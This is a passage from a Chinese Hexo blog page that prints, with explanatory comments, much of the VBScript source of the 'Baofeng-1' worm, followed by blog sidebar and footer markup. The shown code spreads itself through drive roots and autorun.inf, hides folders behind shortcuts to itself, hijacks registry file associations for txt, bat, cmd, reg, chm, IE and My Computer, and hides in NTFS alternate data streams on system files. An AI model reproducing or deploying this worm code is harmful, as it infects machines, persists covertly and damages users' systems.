class="attr">Sub</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">path</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">On</span> <span class="attr">Error</span> <span class="attr">Resume</span> <span class="attr">Next</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">vf</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">vf</span>=<span class="string">FSO.GetFile(path)</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">vf</span>=<span class="string">FSO.GetFolder(path)</span></span></span><br><span class="line"><span class="tag">    <span class="attr">vf.Attributes</span>=<span class="string">6</span> '// <span class="attr">6</span>=<span class="string">2+4</span> 分别是隐藏、系统属性</span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Sub</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//执行<span class="attr">ExeFullName</span>指定的文件</span></span><br><span class="line"><span class="tag"><span class="attr">Sub</span> <span class="attr">Run</span>(<span class="attr">ExeFullName</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">On</span> <span class="attr">Error</span> <span class="attr">Resume</span> <span class="attr">Next</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">WshShell</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">WshShell</span>=<span class="string">WScript.CreateObject(</span>"<span class="attr">WScript.Shell</span>")</span></span><br><span class="line"><span class="tag">    <span class="attr">WshShell.Run</span> <span class="attr">ExeFullName</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">WshShell</span>=<span class="string">Nothing</span></span></span><br><span class="line"><span class="tag"><span class="attr">End</span> <span class="attr">Sub</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">'//感染根目录</span></span><br><span class="line"><span class="tag"><span class="attr">Sub</span> <span class="attr">InfectRoot</span>(<span class="attr">D</span>,<span class="attr">VirusName</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">On</span> <span class="attr">Error</span> <span class="attr">Resume</span> <span class="attr">Next</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Dim</span> <span class="attr">VBSCode</span></span></span><br><span class="line"><span class="tag">    <span class="attr">VBSCode</span>=<span class="string">GetCode(WScript.ScriptFullName)</span></span></span><br><span class="line"><span class="tag">    <span class="attr">VBSPath</span>=<span class="string">D&</span>"<span class="attr">:</span>/"&<span class="attr">VirusName</span></span></span><br><span class="line"><span class="tag">    <span class="attr">If</span> <span class="attr">FSO.FileExists</span>(<span class="attr">VBSPath</span>)=<span class="string">False</span> <span class="attr">Then</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">CreateFile</span>(<span class="attr">VBSCode</span>, <span class="attr">VBSPath</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">Call</span> <span class="attr">SetHiddenAttr</span>(<span class="attr">VBSPath</span>)</span></span><br><span class="line"><span class="tag">    <span class="attr">End</span> <span class="attr">If</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">Folder</span>=<span class="string">Fso.GetFolder(D&</span>"<span class="attr">:</span>/")  '//隐藏根目录下的所有子目录</span></span><br><span class="line"><span class="tag">    <span class="attr">Set</span> <span class="attr">SubFolders</span>=<span class="string">Folder.Subfolders</span></span></span><br><span class="line"><span class="tag">    <span class="attr">For</span> <span class="attr">Each</span> <span class="attr">SubFolder</span> <span class="attr">In</span> <span class="attr">SubFolders</span></span></span><br><span class="line"><span class="tag">        <span class="attr">SetHiddenAttr</span>(<span class="attr">SubFolder.Path</span>)</span></span><br><span class="line"><span class="tag">        <span class="attr">LnkPath</span>=<span class="string">D&</span>"<span class="attr">:</span>/"&<span class="attr">SubFolder.Name</span>&"<span class="attr">.lnk</span>"  '//创建对应的快捷方式</span></span><br><span class="line"><span class="tag">        <span class="attr">TargetPath</span>=<span class="string">D&</span>"<span class="attr">:</span>/"&<span class="attr">VirusName</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Args</span>=<span class="string">""</span>""&<span class="attr">D</span>&"<span class="attr">:</span>/"&<span class="attr">SubFolder.Name</span>& "/<span class="attr">Dir</span>"""</span></span><br><span class="line">        If Fso.FileExists(LnkPath)=False Or GetTargetPath(LnkPath) <> TargetPath Then</span><br><span class="line">            If Fso.FileExists(LnkPath)=True Then</span><br><span class="line">                FSO.DeleteFile LnkPath, True</span><br><span class="line">            End If</span><br><span class="line">            Call CreateShortcut(LnkPath,TargetPath,Args)</span><br><span class="line">        End If</span><br><span class="line">    Next</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//上一步失败了调用这个函数创建快捷方式</span><br><span class="line">Sub CreateShortcut(LnkPath,TargetPath,Args)</span><br><span class="line">    Set Shortcut=WshShell.CreateShortcut(LnkPath)</span><br><span class="line">    with Shortcut</span><br><span class="line">        .TargetPath=TargetPath</span><br><span class="line">        .Arguments=Args</span><br><span class="line">        .WindowStyle=4</span><br><span class="line">        .IconLocation="%SystemRoot%/System32/Shell32.dll, 3"</span><br><span class="line">        .Save</span><br><span class="line">    end with</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//创建autorun.inf文件</span><br><span class="line">Sub CreateAutoRun(D,VirusName)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim InfPath, VBSPath, VBSCode</span><br><span class="line">    InfPath=D&":/AutoRun.inf"</span><br><span class="line">    VBSPath=D&":/"&VirusName</span><br><span class="line">    VBSCode=GetCode(WScript.ScriptFullName)</span><br><span class="line">    If FSO.FileExists(InfPath)=False Or FSO.FileExists(VBSPath)=False Then</span><br><span class="line">        Call CreateFile(VBSCode, VBSPath)</span><br><span class="line">        Call SetHiddenAttr(VBSPath)</span><br><span class="line">        StrInf="[AutoRun]"&VBCRLF&"Shellexecute=WScript.exe "&VirusName&" ""AutoRun"""&VBCRLF&"shell/open=打开(&O)"&VBCRLF&"shell/open/command=WScript.exe "&VirusName&"</span><br><span class="line"></span><br><span class="line">""AutoRun"""&VBCRLF&"shell/open/Default=1"& VBCRLF&"shell/explore=资源管理器(&X)"&VBCRLF&"shell/explore/command=WScript.exe "&VirusName&" ""AutoRun"""</span><br><span class="line">        Call KillImmunity(D)</span><br><span class="line">        Call CreateFile(StrInf, InfPath)</span><br><span class="line">        Call SetHiddenAttr(InfPath)</span><br><span class="line">    End If</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变txt格式文件关联</span><br><span class="line">Sub SetTxtFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/txtfile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变ini格式文件关联</span><br><span class="line">Sub SetIniFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inifile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变inf格式文件关联</span><br><span class="line">Sub SetInfFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/inffile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变bat格式文件关联</span><br><span class="line">Sub SetBatFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/batfile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变cmd格式文件关联</span><br><span class="line">Sub SetCmdFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/cmdfile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变hlp格式文件关联</span><br><span class="line">Sub SethlpFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/hlpfile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变reg格式文件关联</span><br><span class="line">Sub SetRegFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/regfile/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变chm格式文件关联</span><br><span class="line">Sub SetchmFileAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" %1 %* "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/chm.file/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//篡改IE启动设置</span><br><span class="line">Sub SetIEAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value</span><br><span class="line">    Value="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" OIE "</span><br><span class="line">    Call WriteReg("HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Applications/iexplore.exe/shell/open/command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{871C5380-42A0-1069-A2EA-08002B30309D}/shell/OpenHomePage/Command/", Value, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//改变我的电脑的打开关联，包括Win+E</span><br><span class="line">Sub SetMyComputerAss(sFilePath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Value1,Value2</span><br><span class="line">    Value1="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" OMC "</span><br><span class="line">    Value2="%SystemRoot%/System32/WScript.exe "&""""&sFilePath&""""&" EMC "</span><br><span class="line">    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/", "", "REG_SZ")</span><br><span class="line">    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/open/command/", Value1, "REG_EXPAND_SZ")</span><br><span class="line">    Call WriteReg("HKEY_CLASSES_ROOT/CLSID/{20D04FE0-3AEA-1069-A2D8-08002B30309D}/shell/explore/command/", Value2, "REG_EXPAND_SZ")</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//获得系统驱动盘符名 Drive.SerialNumber 盘符序列号 c-->驱动器 C: - 固定<span class="tag"><<span class="name">BR</span>></span>序列号：-1598325125、d-->驱动器 D: - 固定<span class="tag"><<span class="name">BR</span>></span>序列号：237835280、e、f。</span><br><span class="line">Function GetSerialNumber(Drv)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Set d=fso.GetDrive(Drv)</span><br><span class="line">    GetSerialNumber=d.SerialNumber '// 返回十进制序列号，用于唯一标识一个磁盘卷。Select Case d.DriveType     Case 0: t = "未知"    Case 1: t = "可移动"    Case 2: t = "固定"</span><br><span class="line">                           '// Case 3: t = "网络"    Case 4: t = "CD-ROM"    Case 5: t = "RAM 磁盘"      End Select</span><br><span class="line">    GetSerialNumber=Replace(GetSerialNumber,"-","")</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//获得蠕虫病毒路径   &表示字符串相加  GetSpecialFolder 返回指定的特殊文件夹</span><br><span class="line">Function GetMainVirus(N)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    MainVirusName=GetSerialNumber(GetSystemDrive())&".vbs"</span><br><span class="line">    If GetFileSystemType(GetSystemDrive())="NTFS" Then</span><br><span class="line">        If N=1 Then '//System 文件夹，包含库、字体和设备驱动程序文件。 SystemFolder</span><br><span class="line">              GetMainVirus=Fso.GetSpecialFolder(N)&"/smss.exe:"&MainVirusName '//返回 如c:/windows/system32/smss.exe:72161642.vbs</span><br><span class="line">        End If</span><br><span class="line">        If N=0 Then '//Windows 文件夹，包含 Windows 操作系统安装的文件。 WindowsFolder</span><br><span class="line">              GetMainVirus=Fso.GetSpecialFolder(N)&"/explorer.exe:"&MainVirusName '//返回 如c:/windows/explorer.exe:72161642.vbs</span><br><span class="line">        End If</span><br><span class="line">    Else</span><br><span class="line">          GetMainVirus=Fso.GetSpecialFolder(N)&"/"&MainVirusName</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//返回指定路径vbs脚本的运行个数</span><br><span class="line">Function VBSProcessCount(VBSPath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim WMIService, ProcessList, Process</span><br><span class="line">    VBSProcessCount=0</span><br><span class="line">    Set WMIService=GetObject("winmgmts://./root/cimv2")</span><br><span class="line">    Set ProcessList=WMIService.ExecQuery("Select * from Win32_Process Where "&"Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'")</span><br><span class="line">    For Each Process in ProcessList</span><br><span class="line">        If InStr(Process.CommandLine, VBSPath)>0 Then</span><br><span class="line">            VBSProcessCount=VBSProcessCount+1</span><br><span class="line">        End If</span><br><span class="line">    Next</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//'用来计数wscript进程的个数，如果大于等于3个那么返回True</span><br><span class="line">Function PreDblInstance()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    PreDblInstance=False</span><br><span class="line">    If VBSProcessCount(WScript.ScriptFullName)>= 3 Then</span><br><span class="line">        PreDblInstance=True</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//获取快捷方式的vbs脚本地址</span><br><span class="line">Function GetTargetPath(LnkPath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim Shortcut</span><br><span class="line">    Set Shortcut=WshShell.CreateShortcut(LnkPath)</span><br><span class="line">    GetTargetPath=Shortcut.TargetPath</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//读取文件 返回 TextStream</span><br><span class="line">Function GetCode(FullPath)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim FileText</span><br><span class="line">    Set FileText=FSO.OpenTextFile(FullPath, 1) '//打开指定的文件并返回一个 TextStream 对象，可以读取、写入此对象或将其追加到文件。 </span><br><span class="line">                           '// 1 以只读模式打开文件。不能对此文件进行写操作。</span><br><span class="line">    GetCode=FileText.ReadAll '//读入全部 TextStream 文件并返回结果字符串</span><br><span class="line">    FileText.Close</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//获得注册表 版本键值 获取windows版本</span><br><span class="line">Function GetVersion()</span><br><span class="line">    Dim VerInfo</span><br><span class="line">    VerInfo="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Ver"</span><br><span class="line">    If ReadReg(VerInfo)="" Then</span><br><span class="line">        GetVersion=0</span><br><span class="line">    Else</span><br><span class="line">        GetVersion=CInt(ReadReg(VerInfo)) '//CInt 返回表达式，此表达式已被转换为 Integer 子类型的 Variant。</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//网页文件BFAlert.hta</span><br><span class="line">Sub VirusAlert()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim HtaPath,HtaCode</span><br><span class="line">    HtaPath=Fso.GetSpecialFolder(1)&"/BFAlert.hta"</span><br><span class="line">    HtaCode="<span class="tag"><<span class="name">HTML</span>></span><span class="tag"><<span class="name">HEAD</span>></span><span class="tag"><<span class="name">TITLE</span>></span>暴风一号<span class="tag">TITLE</span>></span>"&VBCRLF&"<span class="tag"><<span class="name">HTA:APPLICATION</span> <span class="attr">APPLICATIONNAME</span>=<span class="string">""</span><span class="attr">BoyFine</span> <span class="attr">V1.0</span>"" <span class="attr">SCROLL</span>=<span class="string">""</span><span class="attr">no</span>"" <span class="attr">windowstate</span>=<span class="string">""</span><span class="attr">maximize</span>""</span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">border</span>=<span class="string">""</span><span class="attr">none</span>"""&<span class="attr">VBCRLF</span>&"<span class="attr">SINGLEINSTANCE</span>=<span class="string">""</span><span class="attr">yes</span>"" <span class="attr">CAPTION</span>=<span class="string">""</span><span class="attr">no</span>"" <span class="attr">contextMenu</span>=<span class="string">""</span><span class="attr">no</span>"" <span class="attr">ShowInTaskBar</span>=<span class="string">""</span><span class="attr">no</span>"" <span class="attr">selection</span>=<span class="string">""</span><span class="attr">no</span>""></span>"&VBCRLF&"<span class="tag">HEAD</span>></span><span class="tag"><<span class="name">BODY</span> <span class="attr">bgcolor</span>=<span class="string">#000000</span>></span><span class="tag"><<span class="name">DIV</span> <span class="attr">align</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">=<span class="string">""</span><span class="attr">center</span>""></span>"&VBCRLF&"<span class="tag"><<span class="name">font</span> <span class="attr">style</span>=<span class="string">""</span><span class="attr">font-size:3500</span>%;<span class="attr">font-family:Wingdings</span>;<span class="attr">color</span>=<span class="string">red</span>""></span>N<span class="tag">font</span>></span><span class="tag"><<span class="name">BR</span>></span>"&VBCRLF&"<span class="tag"><<span class="name">font</span> <span class="attr">style</span>=<span class="string">""</span><span class="attr">font-size:200</span>%;<span class="attr">font-family:</span>黑体;<span class="attr">color</span>=<span class="string">red</span>""></span>暴风一号<br><span class="line"></span><br><span class="line"><span class="tag">font</span>></span>"&VBCRLF&"<span class="tag">DIV</span>><span class="tag">BODY</span>><span class="tag">HTML</span>>"<br><span class="line">    If FSO.FileExists(HtaPath)=False Then</span><br><span class="line">        Call CreateFile(HtaCode, HtaPath) '//创建网页文件BFAlert.hta</span><br><span class="line">        Call SetHiddenAttr(HtaPath) '//设置隐藏</span><br><span class="line">    End If</span><br><span class="line">    Call Run(HtaPath)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">'//获得感染注册表时间键</span><br><span class="line">Function GetInfectedDate()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim DateInfo</span><br><span class="line">    DateInfo="HKEY_CURRENT_USER/SoftWare/Microsoft/Windows NT/CurrentVersion/Windows/Date"</span><br><span class="line">    If ReadReg(DateInfo)="" Then</span><br><span class="line">        GetInfectedDate=""</span><br><span class="line">    Else</span><br><span class="line">        GetInfectedDate=CDate(ReadReg(DateInfo))</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">'//弹出光驱</span><br><span class="line">Sub MakeJoke(Times)</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim WMP, colCDROMs</span><br><span class="line">    Set WMP = CreateObject( "WMPlayer.OCX" ) '//创建WMPlayer.OCX插件对象</span><br><span class="line">    Set colCDROMs = WMP.cdromCollection '//系统中光驱</span><br><span class="line">    If colCDROMs.Count >0 Then</span><br><span class="line">        For i=1 to Times</span><br><span class="line">            colCDROMs.Item(0).eject() '//退出抽取式设备</span><br><span class="line">            WScript.Sleep 3000</span><br><span class="line">            colCDROMs.Item(0).eject()</span><br><span class="line">        Next</span><br><span class="line">    End If</span><br><span class="line">    Set WMP = Nothing</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+      
+    </div>
+
+    
+      
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+     
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/多进程编程.html" rel="next" title="多进程编程">
+                多进程编程 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="celestialalpha">
+            
+              <p class="site-author-name" itemprop="name">celestialalpha</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NlbGVzdGlhbGFscGhh" title="GitHub &rarr; https://github.com/celestialalpha"><i class="fa fa-fw fa-github"></i>GitHub</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="bWFpbHRvOmNlbGVzdGlhbGNvZGVAb3V0bG9vay5jb20=" title="E-Mail &rarr; mailto:celestialcode@outlook.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FiY18xMjM2Ng==" title="CSDN &rarr; https://blog.csdn.net/abc_12366"><i class="fa fa-fw fa-globe"></i>CSDN</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cDovL3dlaWJvLmNvbS9jZWxlc3RpYWxhbHBoYQ==" title="Weibo &rarr; http://weibo.com/celestialalpha"><i class="fa fa-fw fa-weibo"></i>Weibo</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9jZWxlc3RpYWxjb2Rh" title="Twitter &rarr; https://twitter.com/celestialcoda"><i class="fa fa-fw fa-twitter"></i>Twitter</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2NlbGVzdGlhbGNvZGE=" title="Facebook &rarr; https://www.facebook.com/celestialcoda"><i class="fa fa-fw fa-facebook"></i>Facebook</span>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#入门教学"><span class="nav-text">入门教学</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mshta命令（Winxp、8、10）"><span class="nav-text">mshta命令（Winxp、8、10）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#暴风一号（病毒）"><span class="nav-text">暴风一号（病毒）</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-yin-yang"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">celestialalpha</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <span class="exturl theme-link" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZw==">NexT.Muse</span> v7.1.1</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.1.1"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+  <script src="/js/exturl.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
